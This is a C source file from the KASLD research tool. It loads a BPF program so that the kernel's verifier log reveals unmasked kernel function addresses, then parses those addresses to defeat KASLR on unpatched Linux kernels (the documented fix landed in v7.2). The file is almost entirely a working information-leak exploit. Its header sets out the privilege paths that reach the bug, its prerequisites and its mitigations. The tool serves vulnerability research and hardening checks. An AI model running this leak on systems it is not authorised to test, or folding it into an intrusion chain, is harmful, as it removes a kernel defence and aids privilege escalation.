// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel .text addresses from the BPF verifier log (unmasked
// BPF_PSEUDO_BTF_ID ldimm64 immediates).
//
// Sibling of bpf_verifier_log.c: the same verifier-log pointer-mask hole
// (kernel/bpf/disasm.c print_bpf_insn) that leaves BPF_PSEUDO_MAP_IDX unmasked
// also leaves BPF_PSEUDO_BTF_ID unmasked. For a BTF_ID ldimm64, the verifier
// (__check_pseudo_btf_id) does
//
//     addr = kallsyms_lookup_name(sym_name);   // the symbol's real kernel VA
//     insn[0].imm = (u32)addr; insn[1].imm = addr >> 32;
//
// and then disassembles the instruction into the returned log. For a
// BTF_KIND_FUNC, addr is the function's kernel .text address — a kernel-text
// interior pointer that bounds the image base (Q_VIRT_IMAGE_BASE, the primary
// KASLR quantity), the value the sibling's direct-map leak does NOT reach.
//
// Several well-known functions are referenced in ONE program (each ldimm64 is
// disassembled), so a single load leaks a spread of .text addresses. The lowest
// is the tightest upper bound on the image base; the highest gives a lower
// bound (image_base >= addr - image_size). Both are emitted.
//
//   Data leaked:      kernel function addresses (interior .text VAs)
//   Kernel subsystem: kernel/bpf — verifier log (disasm.c print_bpf_insn)
//   Address type:     virtual (kernel text)
//   Method:           parsed (hex tokens in the returned verifier log)
//   Patch:            print_bpf_insn masks MAP_IDX/MAP_IDX_VALUE/BTF_ID (v7.2,
//                     commit 72a85e9464a5). Hole present since pseudo_btf_id
//                     (v5.10).
//
// Reachability (identical to bpf_verifier_log.c; self-detecting — only emits
// when real kernel-text pointers come back, otherwise a silent no-op):
//   1. a process with CAP_BPF but not CAP_PERFMON (confined services /
//   container
//      runtimes with split BPF caps);
//   2. a BPF-token-delegated userns (v6.9+) with CAP_BPF but not CAP_PERFMON;
//   3. sysctl kernel.unprivileged_bpf_disabled = 0 (a fully unprivileged user).
// NOT reachable by a fully-unprivileged process on a default-hardened distro
// (unprivileged_bpf_disabled = 1/2 without CAP_BPF).
//
// Prerequisites:
//   CONFIG_DEBUG_INFO_BTF=y (btf_vmlinux) and a readable
//   /sys/kernel/btf/vmlinux (world-readable on modern distros) to obtain
//   btf_ids; absent on minimal / embedded kernels, where the component reports
//   data-source-unavailable.
//
// Engine fit: emitted as VIRT REGION_KERNEL_TEXT interior samples that bound
// Q_VIRT_IMAGE_BASE via range_from_interior — like the perf / mincore
// text-sample leaks, but through the BPF verifier log.
//
// Mitigations:
//   Patched by masking these pseudo types in the verifier log (v7.2). Otherwise
//   unprivileged_bpf_disabled >= 1 removes the unprivileged path; withholding
//   CAP_BPF removes the confined-service path; CONFIG_DEBUG_INFO_BTF=n removes
//   the btf_id source.
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"

#include <errno.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef BPF_PSEUDO_BTF_ID
#define BPF_PSEUDO_BTF_ID 3
#endif

#define MAX_FUNCS 16

/* Local BPF_PROG_LOAD attr (up to fd_array), so the component builds against
 * older cross-toolchain UAPI headers; layout matches the kernel UAPI (8-byte-
 * aligned u64s on 32-bit too). See bpf_verifier_log.c for the rationale. */
typedef uint64_t kasld_aligned_u64 __attribute__((aligned(8)));
struct kasld_bpf_prog_load {
  uint32_t prog_type;
  uint32_t insn_cnt;
  kasld_aligned_u64 insns;
  kasld_aligned_u64 license;
  uint32_t log_level;
  uint32_t log_size;
  kasld_aligned_u64 log_buf;
  uint32_t kern_version;
  uint32_t prog_flags;
  char prog_name[16];
  uint32_t prog_ifindex;
  uint32_t expected_attach_type;
  uint32_t prog_btf_fd;
  uint32_t func_info_rec_size;
  kasld_aligned_u64 func_info;
  uint32_t func_info_cnt;
  uint32_t line_info_rec_size;
  kasld_aligned_u64 line_info;
  uint32_t line_info_cnt;
  uint32_t attach_btf_id;
  uint32_t attach_prog_fd;
  uint32_t core_relo_cnt;
  kasld_aligned_u64 fd_array;
};

struct btf_hdr {
  uint16_t magic;
  uint8_t version;
  uint8_t flags;
  uint32_t hdr_len;
  uint32_t type_off, type_len, str_off, str_len;
};

/* Stable, non-inlined kernel functions present in kallsyms across versions and
 * spread across the image (sched / mm / fs / net / creds), so the leaked spread
 * brackets the image base. The verifier resolves each via kallsyms_lookup_name,
 * so a symbol must actually resolve; those absent on a given kernel are simply
 * skipped. The function identities are not used for the bound. */
static const char *const k_funcs[] = {"schedule",
                                      "do_exit",
                                      "kfree",
                                      "kmem_cache_alloc",
                                      "vfs_read",
                                      "vfs_write",
                                      "vfs_open",
                                      "filp_close",
                                      "sock_recvmsg",
                                      "tcp_sendmsg",
                                      "ip_rcv",
                                      "capable",
                                      "commit_creds",
                                      "prepare_creds",
                                      "get_task_cred",
                                      "wake_up_process",
                                      NULL};

KASLD_EXPLAIN(
    "Parses /sys/kernel/btf/vmlinux for the btf_ids of several well-known "
    "kernel "
    "functions, then loads a socket-filter BPF program with one "
    "BPF_PSEUDO_BTF_ID ldimm64 per function and requests a verifier log. "
    "Before "
    "commit 72a85e9464a5 the verifier's pointer-mask left BTF_ID unmasked, so "
    "the "
    "log printed each resolved kallsyms address — kernel .text pointers that "
    "bracket the image base. Reachable with CAP_BPF (without CAP_PERFMON), a "
    "BPF-token userns, or unprivileged_bpf_disabled=0; a silent no-op on "
    "patched "
    "or non-permitting kernels, or where CONFIG_DEBUG_INFO_BTF is off.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "sysctl:unprivileged_bpf_disabled=0\n"
           "bypass:CAP_BPF\n"
           "config:CONFIG_DEBUG_INFO_BTF\n"
           "patch:v7.2\n");

static long bpf_(int cmd, union bpf_attr *attr, unsigned int size) {
  return syscall(SYS_bpf, cmd, attr, size);
}

/* Per-kind trailing byte count after the 12-byte btf_type (UAPI-fixed). */
static uint32_t btf_trail(uint32_t kind, uint32_t vlen) {
  switch (kind) {
  case 1:
    return 4; /* INT */
  case 3:
    return 12; /* ARRAY */
  case 4:
  case 5:
    return vlen * 12; /* STRUCT/UNION: btf_member */
  case 6:
    return vlen * 8; /* ENUM: btf_enum */
  case 13:
    return vlen * 8; /* FUNC_PROTO: btf_param */
  case 14:
    return 4; /* VAR: btf_var */
  case 15:
    return vlen * 12; /* DATASEC: btf_var_secinfo */
  case 17:
    return 4; /* DECL_TAG: btf_decl_tag */
  case 19:
    return vlen * 12; /* ENUM64: btf_enum64 */
  default:
    return 0; /* PTR/FWD/TYPEDEF/CV-quals/FUNC/FLOAT/TYPE_TAG */
  }
}

/* Walk the vmlinux BTF and collect btf_ids for the KIND_FUNC entries whose
 * names appear in k_funcs[], into ids[0..MAX_FUNCS). Returns the count, or 0
 * with *why set on a source/parse failure. */
static int find_func_btf_ids(uint32_t *ids, const char **why) {
  *why = "read /sys/kernel/btf/vmlinux";
  FILE *f = kasld_fopen("/sys/kernel/btf/vmlinux", "rb");
  if (!f)
    return 0;
  if (fseek(f, 0, SEEK_END) != 0) {
    fclose(f);
    return 0;
  }
  long n = ftell(f);
  if (n < (long)sizeof(struct btf_hdr) || fseek(f, 0, SEEK_SET) != 0) {
    fclose(f);
    return 0;
  }
  uint8_t *b = malloc((size_t)n);
  if (!b) {
    fclose(f);
    return 0;
  }
  size_t got = fread(b, 1, (size_t)n, f);
  fclose(f);
  if (got != (size_t)n) {
    free(b);
    return 0;
  }

  struct btf_hdr *h = (struct btf_hdr *)b;
  *why = "parse BTF header";
  if (h->magic != 0xeb9f) {
    free(b);
    return 0;
  }
  unsigned long tbase = (unsigned long)h->hdr_len + h->type_off;
  unsigned long sbase = (unsigned long)h->hdr_len + h->str_off;
  if (tbase + h->type_len > (unsigned long)n ||
      sbase + h->str_len > (unsigned long)n) {
    free(b);
    return 0;
  }
  uint8_t *p = b + tbase, *end = p + h->type_len;
  const char *strs = (const char *)(b + sbase);
  uint32_t id = 0;
  int count = 0;
  *why = "find resolvable KIND_FUNC entries in BTF";
  while (p + 12 <= end && count < MAX_FUNCS) {
    uint32_t name_off = *(uint32_t *)p;
    uint32_t info = *(uint32_t *)(p + 4);
    uint32_t kind = (info >> 24) & 0x1f;
    uint32_t vlen = info & 0xffffff;
    id++;
    if (kind == 12 && name_off < h->str_len) { /* BTF_KIND_FUNC */
      const char *name = strs + name_off;
      for (int i = 0; k_funcs[i]; i++) {
        if (strcmp(name, k_funcs[i]) == 0) {
          ids[count++] = id;
          break;
        }
      }
    }
    p += 12 + btf_trail(kind, vlen);
  }
  free(b);
  return count;
}

/* Collect the lowest and highest kernel-text addresses printed in the log. On a
 * patched kernel every immediate prints as 0x0 and other tokens fail the
 * kernel-text test, so *n stays 0. */
static void text_addr_range(const char *log, unsigned long *lo,
                            unsigned long *hi, int *n) {
  const char *p = log;
  *lo = 0;
  *hi = 0;
  *n = 0;
  while ((p = strstr(p, "0x")) != NULL) {
    char *e = NULL;
    unsigned long v = strtoul(p, &e, 16);
    p = (e && e != p) ? e : p + 2;
    if (v == 0 || !kasld_addr_is_kernel_text(v))
      continue;
    if (*n == 0 || v < *lo)
      *lo = v;
    if (*n == 0 || v > *hi)
      *hi = v;
    (*n)++;
  }
}

int main(int argc, char **argv) {
  kasld_cli(argc, argv);
  /* Live host probe: loads a BPF program into the running kernel. */
  if (kasld_skip_live_probe("bpf_verifier_ksym"))
    return 0;

  uint32_t ids[MAX_FUNCS];
  const char *why = "";
  int nids = find_func_btf_ids(ids, &why);
  if (nids == 0) {
    kasld_err("no btf_ids (%s) — CONFIG_DEBUG_INFO_BTF off, or BTF unreadable",
              why);
    return KASLD_EXIT_UNAVAILABLE;
  }

  kasld_info(
      "loading a BPF program (%d btf_ids) to leak .text pointers via the "
      "verifier log ...",
      nids);

  /* For each func: `r0 = &func (BTF_ID, vmlinux)` (a 2-slot ldimm64). Then
   * r0 = 0; exit. Each ldimm64 is disassembled into the log. */
  struct bpf_insn prog[MAX_FUNCS * 2 + 2];
  int k = 0;
  for (int i = 0; i < nids; i++) {
    struct bpf_insn ld0 = {.code = BPF_LD | BPF_DW | BPF_IMM,
                           .dst_reg = BPF_REG_0,
                           .src_reg = BPF_PSEUDO_BTF_ID,
                           .imm = (int)ids[i]};
    struct bpf_insn ld1 = {.code = 0, .imm = 0}; /* vmlinux BTF */
    prog[k++] = ld0;
    prog[k++] = ld1;
  }
  struct bpf_insn mov = {
      .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = BPF_REG_0, .imm = 0};
  struct bpf_insn ret = {.code = BPF_JMP | BPF_EXIT};
  prog[k++] = mov;
  prog[k++] = ret;

  char log[65536];
  log[0] = '\0';

  struct kasld_bpf_prog_load pl;
  memset(&pl, 0, sizeof(pl));
  pl.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
  pl.insn_cnt = (uint32_t)k;
  pl.insns = (uint64_t)(uintptr_t)prog;
  pl.license = (uint64_t)(uintptr_t)"GPL";
  pl.log_level = 2;
  pl.log_size = sizeof(log);
  pl.log_buf = (uint64_t)(uintptr_t)log;

  long prog_fd = bpf_(BPF_PROG_LOAD, (union bpf_attr *)&pl, sizeof(pl));
  int load_errno = errno;
  if (prog_fd >= 0)
    close((int)prog_fd);

  unsigned long lo, hi;
  int found;
  text_addr_range(log, &lo, &hi, &found);
  if (found == 0) {
    if (prog_fd < 0 && (load_errno == EPERM || load_errno == EACCES)) {
      kasld_err("BPF program load denied (unprivileged_bpf_disabled, or no "
                "CAP_BPF)");
      return KASLD_EXIT_NOPERM;
    }
    kasld_err("no kernel-text pointer in the verifier log (masked: patched "
              "kernel, or CAP_PERFMON grants ptr access)");
    return 0;
  }

  kasld_found(
      "leaked %d .text pointer(s) via verifier log; range [0x%lx, 0x%lx]",
      found, lo, hi);
  /* Lowest: tightest upper bound on the image base. Highest: a lower bound via
   * the image size. Both are interior text samples. */
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, lo, NULL,
                      CONF_PARSED);
  if (hi != lo)
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, hi, NULL,
                        CONF_PARSED);
  return 0;
}
